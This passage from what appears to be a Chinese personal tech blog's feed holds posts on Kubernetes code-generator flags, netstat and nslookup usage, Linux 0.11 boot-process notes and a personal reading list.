ProductInstanceVpcInfoes \    # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes] \  # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfo,ProductInstanceVpcInfoes] \  # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfo,ProductInstanceVpcInfoes&quot;] \  # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions &quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot; \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;, &quot;Endpoints:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;],[&quot;Endpoints:Endpointes&quot;] \</span><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/kubernetes/code-generator">code-generator github</a><br><a href="https://juejin.cn/post/7096484178128011277"># code-generator简单介绍</a><br>[# [k8s自定义controller设计与实现] (有controller的业务处理示例，还有注释)<br><a href="https://www.51cto.com/article/692169.html">Kubernetes中自定义Controller</a> (有controller的业务处理示例，还有注释)</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】code-generator</title>
    <link href="/2023/03/02/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/"/>
    <url>/2023/03/02/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91code-generator/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230303100520.png" alt="image.png"></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>code-generator是用来干什么的？有什么功能？</li><li></li></ol><h2 id="待解决"><a href="#待解决" class="headerlink" title="待解决"></a>待解决</h2><p>..&#x2F;vendor&#x2F;k8s.io&#x2F;code-generator&#x2F;generate-groups.sh</p><p>code-generator项目下的generate-groups.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/usr/bin/env bash</span><br><br><span class="hljs-comment"># Copyright 2017 The Kubernetes Authors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);</span><br><span class="hljs-comment"># you may not use this file except in compliance with the License.</span><br><span class="hljs-comment"># You may obtain a copy of the License at</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#     http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Unless required by applicable law or agreed to in writing, software</span><br><span class="hljs-comment"># distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="hljs-comment"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="hljs-comment"># See the License for the specific language governing permissions and</span><br><span class="hljs-comment"># limitations under the License.</span><br><br><span class="hljs-built_in">set</span> -o errexit<br><span class="hljs-built_in">set</span> -o nounset<br><span class="hljs-built_in">set</span> -o pipefail<br><br><span class="hljs-comment"># generate-groups generates everything for a project with external types only, e.g. a project based</span><br><span class="hljs-comment"># on CustomResourceDefinitions.</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$#</span>&quot;</span> -lt 4 ] || [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span> == <span class="hljs-string">&quot;--help&quot;</span> ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">Usage: $(basename &quot;$0&quot;) &lt;generators&gt; &lt;output-package&gt; &lt;apis-package&gt; &lt;groups-versions&gt; ...</span><br><span class="hljs-string"></span><br><span class="hljs-string">  &lt;generators&gt;        the generators comma separated to run (deepcopy,defaulter,client,lister,informer) or &quot;all&quot;.</span><br><span class="hljs-string">  &lt;output-package&gt;    the output package name (e.g. github.com/example/project/pkg/generated).</span><br><span class="hljs-string">  &lt;apis-package&gt;      the external types dir (e.g. github.com/example/api or github.com/example/project/pkg/apis).</span><br><span class="hljs-string">  &lt;groups-versions&gt;   the groups and their versions in the format &quot;groupA:v1,v2 groupB:v1 groupC:v2&quot;, relative</span><br><span class="hljs-string">                      to &lt;api-package&gt;.</span><br><span class="hljs-string">  ...                 arbitrary flags passed to all generator binaries.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Examples:</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) all             github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">  $(basename &quot;$0&quot;) deepcopy,client github.com/example/project/pkg/client github.com/example/project/pkg/apis &quot;foo:v1 bar:v1alpha1,v1beta1&quot;</span><br><span class="hljs-string">EOF</span><br>  <span class="hljs-built_in">exit</span> 0<br><span class="hljs-keyword">fi</span><br><br>GENS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OUTPUT_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span><br>APIS_PKG=<span class="hljs-string">&quot;<span class="hljs-variable">$3</span>&quot;</span><br>GROUPS_WITH_VERSIONS=<span class="hljs-string">&quot;<span class="hljs-variable">$4</span>&quot;</span><br><span class="hljs-built_in">shift</span> 4<br><br>(<br>  <span class="hljs-comment"># To support running this script from anywhere, first cd into this directory,</span><br>  <span class="hljs-comment"># and then install with forced module mode on and fully qualified name.</span><br>  <span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(dirname <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;0&#125;</span>&quot;</span>)</span>&quot;</span><br>  GO111MODULE=on go install k8s.io/code-generator/cmd/&#123;defaulter-gen,client-gen,lister-gen,informer-gen,deepcopy-gen&#125;<br>)<br><span class="hljs-comment"># Go installs the above commands to get installed in $GOBIN if defined, and $GOPATH/bin otherwise:</span><br>GOBIN=<span class="hljs-string">&quot;<span class="hljs-subst">$(go env GOBIN)</span>&quot;</span><br>gobin=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GOBIN:-$(go env GOPATH)/bin&#125;</span>&quot;</span><br><br><span class="hljs-keyword">function</span> codegen::<span class="hljs-function"><span class="hljs-title">join</span></span>() &#123; <span class="hljs-built_in">local</span> IFS=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>; <span class="hljs-built_in">shift</span>; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;$*&quot;</span>; &#125;<br><br><span class="hljs-comment"># enumerate group versions</span><br>FQ_APIS=() <span class="hljs-comment"># e.g. k8s.io/api/apps/v1</span><br><span class="hljs-keyword">for</span> GVs <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span>; <span class="hljs-keyword">do</span><br>  IFS=: <span class="hljs-built_in">read</span> -r G Vs &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GVs&#125;</span>&quot;</span><br><br>  <span class="hljs-comment"># enumerate versions</span><br>  <span class="hljs-keyword">for</span> V <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;Vs//,/ &#125;</span>; <span class="hljs-keyword">do</span><br>    FQ_APIS+=(<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;APIS_PKG&#125;</span>/<span class="hljs-variable">$&#123;G&#125;</span>/<span class="hljs-variable">$&#123;V&#125;</span>&quot;</span>)<br>  <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;deepcopy&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating deepcopy funcs&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/deepcopy-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      -O zz_generated.deepcopy \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;client&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating clientset for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/client-gen&quot;</span> \<br>      --clientset-name <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --input-base <span class="hljs-string">&quot;&quot;</span> \<br>      --input <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;lister&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating listers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/lister-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span> = <span class="hljs-string">&quot;all&quot;</span> ] || grep -qw <span class="hljs-string">&quot;informer&quot;</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;GENS&#125;</span>&quot;</span>; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Generating informers for <span class="hljs-variable">$&#123;GROUPS_WITH_VERSIONS&#125;</span> at <span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span><br>  <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;gobin&#125;</span>/informer-gen&quot;</span> \<br>      --input-dirs <span class="hljs-string">&quot;<span class="hljs-subst">$(codegen::join , <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;FQ_APIS[@]&#125;</span>&quot;</span>)</span>&quot;</span> \<br>      --versioned-clientset-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_PKG_NAME:-clientset&#125;</span>/<span class="hljs-variable">$&#123;CLIENTSET_NAME_VERSIONED:-versioned&#125;</span>&quot;</span> \<br>      --listers-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/listers&quot;</span> \<br>      --output-package <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;OUTPUT_PKG&#125;</span>/informers&quot;</span> \<br>      --plural-exceptions <span class="hljs-string">&quot;ProductInstanceVpcInfo:ProductInstanceVpcInfoes&quot;</span> \<br>      <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoint:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [Endpointes:Endpointes] \</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes:ProductInstanceVpcInfoes] \</span><br>      <span class="hljs-comment"># --plural-exceptions ProductInstanceVpcInfoes:ProductInstanceVpcInfoes \</span><br>      <span class="hljs-comment"># --plural-exceptions ProductInstanceVpcInfoes \    # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfoes] \  # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [ProductInstanceVpcInfo,ProductInstanceVpcInfoes] \  # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfo,ProductInstanceVpcInfoes&quot;] \  # 会报错</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions &quot;Endpoints:Endpointes&quot;, &quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot; \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;, &quot;Endpoints:Endpointes&quot;] \</span><br>      <span class="hljs-comment"># --plural-exceptions [&quot;ProductInstanceVpcInfos:ProductInstanceVpcInfoes&quot;],[&quot;Endpoints:Endpointes&quot;] \</span><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/kubernetes/code-generator">code-generator github</a><br><a href="https://juejin.cn/post/7096484178128011277"># code-generator简单介绍</a><br>[# [k8s自定义controller设计与实现] (有controller的业务处理示例，还有注释)<br><a href="https://www.51cto.com/article/692169.html">Kubernetes中自定义Controller</a> (有controller的业务处理示例，还有注释)</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【chatGPT】注册</title>
    <link href="/2023/03/01/tools/%E3%80%90chatGPT%E3%80%91%E6%B3%A8%E5%86%8C/"/>
    <url>/2023/03/01/tools/%E3%80%90chatGPT%E3%80%91%E6%B3%A8%E5%86%8C/</url>
    
    <content type="html"><![CDATA[<p>参考：</p><p><a href="https://foofish.net/how-to-registe-chatGPT.html"># ChatGPT保姆级注册教程</a><br><a href="https://chat.openai.com/chat">https://chat.openai.com/chat</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】netstat常用命令</title>
    <link href="/2023/02/28/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91netstat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/02/28/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91netstat%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">netstat -ap <span class="hljs-comment">--unix </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】nslookup常用命令</title>
    <link href="/2023/02/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nslookup%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/02/21/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91nslookup%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查询A记录</span><br>nslookup 的查询在不指定参数的情况下，默认查询的类型为A<br>nslookup baidu.com = nslookup -qt=A baidu.com <br><br><br><span class="hljs-comment"># 如何使用指定DNS服务器查询?</span><br>语法为 nslookup -qt=类型 目标域名 指定的DNS服务器IP或域名<br>例子：nslookup -qt=A tool.chinaz.com 8.8.8.8<br>= nslookup tool.chinaz.com 8.8.8.8<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux0.11 源码趣读</title>
    <link href="/2023/02/16/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux0.11%20%E6%BA%90%E7%A0%81%E8%B6%A3%E8%AF%BB/"/>
    <url>/2023/02/16/linux%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/Linux0.11%20%E6%BA%90%E7%A0%81%E8%B6%A3%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>源码下载地址：<a href="http://www.oldlinux.org/Linux.old/">http://www.oldlinux.org/Linux.old/</a></p><h2 id="Part-1：进入内核前的苦力活"><a href="#Part-1：进入内核前的苦力活" class="headerlink" title="Part 1：进入内核前的苦力活"></a>Part 1：进入内核前的苦力活</h2><h3 id="01｜开机后最开始的两行代码是什么？"><a href="#01｜开机后最开始的两行代码是什么？" class="headerlink" title="01｜开机后最开始的两行代码是什么？"></a>01｜开机后最开始的两行代码是什么？</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://www.oldlinux.org/Linux.old/kernel/0.1x/linux-0.11.tar.gz<br>tar -zxvf linux-0.11.tar.gz<br></code></pre></td></tr></table></figure><p>CPU 中有个 PC 寄存器  寄存器在CPU中吗？<br>内存（RAM）？<br>ROM(BIOS)</p><p>Intel 手册规定，开机后 PC 寄存器要初始化为 0xFFFF0，也就是从这个内存地址开始，执行 CPU 的第一条指令。</p><p>ds 是默认加上的，表示在 ds 这个段基址处，往后再偏移 0x0001 单位，将这个位置的内存数据复制到 ax 寄存器中。</p><p>ds 这个数据段寄存器的作用就是这样，方便了描述一个内存地址时，可以省略一个基址<br>第一步，BIOS 将操作系统代码加载到内存 0x7c00；第二步，通过 mov 指令将默认的数据段寄存器 ds 的值改为 0x07c0，方便以后的基址寻址方式。</p><p>访问指令时 cs 就是基址，访问栈时 ss 是基址。</p><p>内存地址为何是0x7c00，可以参考这篇文章 <a href="http://www.ruanyifeng.com/blog/2015/09/0x7c00.html">http://www.ruanyifeng.com/blog/2015/09/0x7c00.html</a><br>0x7C00这个地址来自Intel的第一代个人电脑芯片8088，以后的CPU为了保持兼容，一直使用这个地址。 当时，搭配的操作系统是86-DOS。这个操作系统需要的内存最少是32KB。我们知道，内存地址从0x0000开始编号，32KB的内存就是0x0000～0x7FFF 由于一个扇区是512字节，主引导记录本身也会产生数据，需要另外留出512字节保存。所以，它的预留位置就变成了： 0x7FFF - 512 - 512 + 1 &#x3D; 0x7C00 至于为什么把引导程序放在最后的位置？因为操作系统启动后，主引导记录就没有用处了，此后它所在的内存地址可以被操作系统重新利用，所以放在最后了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【books】阅读书籍</title>
    <link href="/2023/02/16/books/%E3%80%90books%E3%80%91%E9%98%85%E8%AF%BB%E4%B9%A6%E7%B1%8D/"/>
    <url>/2023/02/16/books/%E3%80%90books%E3%80%91%E9%98%85%E8%AF%BB%E4%B9%A6%E7%B1%8D/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th align="left">总阅读</th><th align="left">年度阅读</th><th align="left">书名</th><th align="left">作者</th><th align="left">开始时间</th><th align="left">结束时间</th><th align="left">历时(天)</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">1</td><td align="left">《凭什么让人喜欢你》</td><td align="left"></td><td align="left">2019.4.18</td><td align="left">2019.5.5</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">2</td><td align="left">1</td><td align="left">《小强升职记》</td><td align="left"></td><td align="left">2020.6.1</td><td align="left">2020.6.5</td><td align="left">5</td></tr><tr><td align="left">3</td><td align="left">2</td><td align="left">《偷影子的人》</td><td align="left"></td><td align="left">2020.6.6</td><td align="left">2020.6.15</td><td align="left">10</td></tr><tr><td align="left">4</td><td align="left">3</td><td align="left">《晨间日记的奇迹》</td><td align="left"></td><td align="left">2020.6.16</td><td align="left">2020.6.21</td><td align="left">6</td></tr><tr><td align="left">5</td><td align="left">4</td><td align="left">《自控力》</td><td align="left"></td><td align="left">2020.11.7</td><td align="left">2020.12.31</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">6</td><td align="left">1</td><td align="left">《蔡康永的说话之道》</td><td align="left"></td><td align="left">2021.1.4</td><td align="left">2021.1.8</td><td align="left">5</td></tr><tr><td align="left">7</td><td align="left">2</td><td align="left">《蔡康永的说话之道2》</td><td align="left"></td><td align="left">2021.1.12</td><td align="left">2021.1.20</td><td align="left"></td></tr><tr><td align="left">8</td><td align="left">3</td><td align="left">《生活需要仪式感》</td><td align="left"></td><td align="left">2021.3.8</td><td align="left">2021.3.24</td><td align="left"></td></tr><tr><td align="left">9</td><td align="left">4</td><td align="left">《兔子什么都知道》</td><td align="left"></td><td align="left">2021.3.16</td><td align="left">2021.4.20</td><td align="left"></td></tr><tr><td align="left">10</td><td align="left">5</td><td align="left">《纳兰容若词传》</td><td align="left"></td><td align="left">2021.5.24</td><td align="left">2021.7.2</td><td align="left"></td></tr><tr><td align="left">11</td><td align="left">6</td><td align="left">《一辈子很长要和有趣的人在一起》</td><td align="left"></td><td align="left">2021.5.26</td><td align="left">2021.7.16</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">12</td><td align="left">1</td><td align="left">《月亮与六便士》</td><td align="left"></td><td align="left">2022.1.13</td><td align="left">2022.5.6</td><td align="left"></td></tr><tr><td align="left">13</td><td align="left">2</td><td align="left">《皮囊》</td><td align="left"></td><td align="left">2022.4.23</td><td align="left">2022.4.30</td><td align="left"></td></tr><tr><td align="left">14</td><td align="left">3</td><td align="left">《追风筝的人》</td><td align="left"></td><td align="left">2022.5.7</td><td align="left">2022.7.19</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">15</td><td align="left">1</td><td align="left">《撒哈拉的故事》</td><td align="left"></td><td align="left">2022.12.31</td><td align="left">2023.02.02</td><td align="left"></td></tr><tr><td align="left">16</td><td align="left">2</td><td align="left">《谁动了我的奶酪》</td><td align="left"></td><td align="left">2023.02.16</td><td align="left">2023.02.16</td><td align="left"></td></tr><tr><td align="left">17</td><td align="left">3</td><td align="left">《你今天真好看》</td><td align="left"></td><td align="left">2023.02.17</td><td align="left">2023.02.17</td><td align="left"></td></tr><tr><td align="left">18</td><td align="left">4</td><td align="left">《德米安-彷徨少年时》</td><td align="left"></td><td align="left">2023.06.10</td><td align="left">2023.06.11</td><td align="left"></td></tr><tr><td align="left">19</td><td align="left">5</td><td align="left">《悉达多》</td><td align="left"></td><td align="left">2023.06.22</td><td align="left">2023.06.28</td><td align="left"></td></tr><tr><td align="left">20</td><td align="left">6</td><td align="left">《窗边的小豆豆》</td><td align="left"></td><td align="left">2023.07.01</td><td align="left">2023.07.06</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">《别想太多啦》</td><td align="left"></td><td align="left">2022.9.12</td><td align="left">xxx</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">《硬派健身100问》</td><td align="left"></td><td align="left">2023.02.07</td><td align="left">xxx</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left">《平凡的世界》</td><td align="left"></td><td align="left">2023.4.23</td><td align="left">xxx</td><td align="left"></td></tr><tr><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr></tbody></table><h1 id="2023阅读书籍"><a href="#2023阅读书籍" class="headerlink" title="2023阅读书籍"></a>2023阅读书籍</h1><h2 id="《撒哈拉的故事》"><a href="#《撒哈拉的故事》" class="headerlink" title="《撒哈拉的故事》"></a>《撒哈拉的故事》</h2><p>阅读方式：微信读书 –&gt; 